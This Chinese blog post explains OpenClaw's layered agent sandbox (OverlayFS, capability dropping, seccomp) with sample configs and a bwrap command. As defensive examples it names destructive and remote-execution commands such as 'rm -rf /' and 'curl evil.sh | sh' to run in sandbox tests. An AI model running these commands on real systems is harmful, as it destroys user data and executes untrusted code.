---
title: OpenClaw 沙箱纵深防御：从文件系统隔离到能力限制，为什么 Agent 动不了你的文件
feedId: 31458
source: 综合讨论
publishedAt: 2026-08-03
---

# OpenClaw 沙箱纵深防御：从文件系统隔离到能力限制，为什么 Agent 动不了你的文件

## 背景：当 Agent 拿到 Shell

OpenClaw 作为面向自动化的 Agent 运行环境，经常需要为插件或 MCP 工具链提供代码执行能力。一旦 Agent 具备执行 `sh` / `python` / `node` 的能力，一个绕不开的问题就摆上台面：如果任务指令被误导，或者模型产生了有害意图，如何保证它不会 `rm -rf ~`、不会篡改 `~/.ssh/authorized_keys`、不会读取 `.env`？

传统方案无非两条路：全量虚拟化（VM / Docker）太重，且难以与用户现有文件系统高效交互；而直接裸跑进程配上简单的目录权限控制，又很容易被 Agent 误用或绕过。OpenClaw 从设计初期就把安全执行边界作为核心约束，采用了一种更轻量、更贴合本地自动化场景的 **纵深防御 sandbox 模型**。这篇文章不是概念宣导，而是把它拆解到可复现的配置和排障细节，帮助你在自己的 OpenClaw 部署里把“误删文件”这类事故消灭在源头。

## 问题：文件操作权限失控的三个典型场景

在实践中，文件安全风险通常出现在这三个时刻：

1. **Agent 通过代码解释器执行任意脚本**，直接调用 `os.remove()` / `shutil.rmtree()`，如果解释器以当前用户权限运行，破坏力等于用户本人。
2. **插件或工具通过 MCP 声明了文件读写能力**，但未限定路径，模型穿透 Prompt 后可能访问敏感区域。
3. **Agent 借助系统工具链（如 `find -delete`、`mv`、`chmod`）绕过应用层限制**，因为这些工具执行时的权限由系统决定，不经过 OpenClaw 自身的文件访问抽象层。

所以安全设计不能只靠 Prompt 里的“不要乱删”或简单的路径黑白名单，必须从操作系统层面把 Agent 的权限关进笼子。

## 做法：三层沙箱策略与配置步骤

OpenClaw 的 sandbox 模型可以拆成三层，它们叠加发挥作用。下面以 Linux 环境下最常用、也最稳妥的配置为例说明。

### 第 1 层：文件系统视图隔离（OverlayFS）

核心思想：给 Agent 一个“复制出来的世界”，写操作落到临时层，不触碰真实文件。

在 OpenClaw 的 `claw.yaml`（或通过环境变量）中开启 overlay 模式：

```yaml
sandbox:
  enabled: true
  fs:
    mode: overlay
    lowerdir: /home/user             # 只读基础层，可缩小到项目目录
    upperdir: /tmp/openclaw/upper    # 写操作落在这里
    workdir:  /tmp/openclaw/work
    mountpoint: /home/user/safe      # Agent 看到的工作目录
    readonly_home: true              # 强制将 HOME 设为只读
```

启动后，Agent 在 `/home/user/safe` 下即使执行 `rm -rf *`，也只影响 `upperdir` 中的临时数据，真实 `/home/user` 完全不受影响。要重置环境，只需清空 `upperdir` 即可。

> 验证方法：在 OpenClaw 对话中让 Agent “列出 `/home/user` 下的文件，然后尝试删除某个已有文件”，再去真实的 `/home/user` 检查文件是否还在，同时查看 `upperdir` 中是否产生了对应的“删除操作”白文件（whiteout）。

### 第 2 层：进程能力裁剪（Capabilities）

即使文件系统隔离了，Agent 仍可能通过挂载操作、修改文件属性等方式干扰宿主。这一层通过 Linux capabilities 加固：

```yaml
sandbox:
  capabilities:
    drop: all               # 移除所有特权能力
    add: [CAP_NET_BIND_SERVICE]  # 按需添加，比如需要绑定低端口
```

这将导致 Agent 进程失去 `CAP_SYS_ADMIN`（无法挂载/卸载）、`CAP_FOWNER`（无法修改不属于自己的文件属性）、`CAP_DAC_OVERRIDE`（无法绕过权限检查）等关键能力。即使 overlay 层出现漏洞，Agent 也没有足够权限去影响下层文件。

### 第 3 层：系统调用过滤（Seccomp）

为了防御未知的内核漏洞利用或意外系统调用，OpenClaw 允许加载自定义 seccomp 配置文件。一般使用默认的 `openclaw-default` 配置，它禁用了 `mount`、`pivot_root`、`chroot` 等命名空间相关调用，并限定了文件操作相关的调用白名单。如果需要允许 Agent 下载文件或解压，可以在 profile 中按需放行 `sendfile`、`copy_file_range` 等。

```yaml
sandbox:
  seccomp_profile: default
  extra_allowed_syscalls: [sendfile, copy_file_range]   # 根据实际任务开放
```

这三层组合在一起，构成了一条清晰的防御链：即使最外层的文件系统隔离被突破，能力裁剪和系统调用过滤也会在下一道防线阻止破坏动作。

## 踩坑点：当 Agent 需要“合法访问外部文件”时

现实任务中，Agent 经常需要读取用户指定的外部数据（例如“处理 ~/Downloads/data.csv”），或生成输出文件到用户可触及的位置。如果 sandbox 把整个 `/home` 只读挂载，任务直接失败。

**坑 1：路径白名单配置不生效**  
开放访问不能简单地把 `lowerdir` 放大，那样会破坏隔离性。正确的做法是使用 **bind mount 白名单**，把特定目录或文件以可读写方式映射进沙箱：

```yaml
sandbox:
  bindmounts:
    - source: /home/user/Downloads
      target: /workspace/input
      writable: false          # 只读提供数据
    - source: /home/user/output
      target: /workspace/output
      writable: true
```

这样 Agent 只能在 `output` 下自由写，但不能触碰 `Downloads` 里的源文件。

**坑 2：上层工具依赖宿主路径**  
一些自动化脚本或 Python 包会硬编码读取 `~/.config` 或调用 `/usr/bin` 下的工具。需要确保沙箱中提供了最小的运行时依赖，可以把 `/usr` 以只读方式绑定进去，或使用容器镜像方式构建 rootfs。OpenClaw 支持 `rootfs` 选项，指定一个最小化的 Linux 根文件系统给 Agent 使用。

**坑 3：开发者模式未关闭导致绕过**  
在调试时，有些用户会设置 `sandbox.enabled: false`，之后忘记改回。建议将 sandbox 配置纳入版本管理，并在部署流水线中增加检查步骤，避免裸奔上线。

## 可复用建议：把三层防御移植到自己的 Agent 项目

即使你不使用 OpenClaw 的全部功能，这套“Overlay + Capabilities + Seccomp”的模型也非常适合在自建 Agent 系统中复用。

- **轻量实现**：可以用 `bubblewrap`（`bwrap`）一行命令跑出类似效果，无需 Docker 守护进程。例如：
  ```bash
  bwrap --ro-bind /home/user /home/user \
        --tmpfs /tmp \
        --cap-drop ALL \
        --seccomp 9 \
        bash
  ```
- **与 MCP 结合**：将模型上下文协议里的文件操作能力映射到沙箱内的虚拟路径，对外暴露的“文件”永远是沙箱层里的替身，避免暴露真实路径。
- **CI/CD 化测试**：写一个专门用于破坏性测试的 Agent 任务，定期在沙箱中执行 `rm -rf /`、`curl evil.sh | sh` 等，确认宿主机毫发无损，这比任何理论论证都更有说服力。

另一条关键经验是：不要试图用“更严格的 Prompt”替代系统级隔离。大模型的行为边界永远是概率性的，操作系统级约束才是确定性的安全边界。

## 总结

OpenClaw 的 sandbox 模型之所以能让 Agent 不误删文件，靠的不是某个单一魔法配置，而是 Overlay 文件系统提供的写时拷贝视图、Linux capabilities 对特权操作的裁撤，以及 seccomp 对底层系统调用的精细化控制。这三者组合后，Agent 能看到文件、能读写工作区，但它的“破坏力”被严格限制在一个临时层里，任何越界行为要么被拒绝，要么根本找不到真实文件。

对日常使用者而言，开启 sandbox 几乎没有感知成本，但它能让你放心地把高风险自动化任务交给 Agent，把安全审查从“事后恢复”变为“事前隔离”。如果你接下来的项目需要 Agent 执行不可信代码，不妨花半小时把自己的 OpenClaw 配置成 overlay 模式，然后用一个删除测试验证——那一刻你会意识到，工程化的安全才是最实在的安心。

---

